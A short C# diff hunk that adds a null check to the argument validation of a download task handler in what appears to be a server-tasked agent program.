@@ -41,8 +41,8 @@ namespace Agent
         public async Task Execute(ServerJob job)
         {
             DownloadArgs args = JsonSerializer.Deserialize<DownloadArgs>(job.task.parameters);
-
-            if(!args.Validate(out var message))
+            string message = string.Empty;
+            if(args is null || !args.Validate(out message))
             {
                 await messageManager.AddResponse(new DownloadResponse
                 {
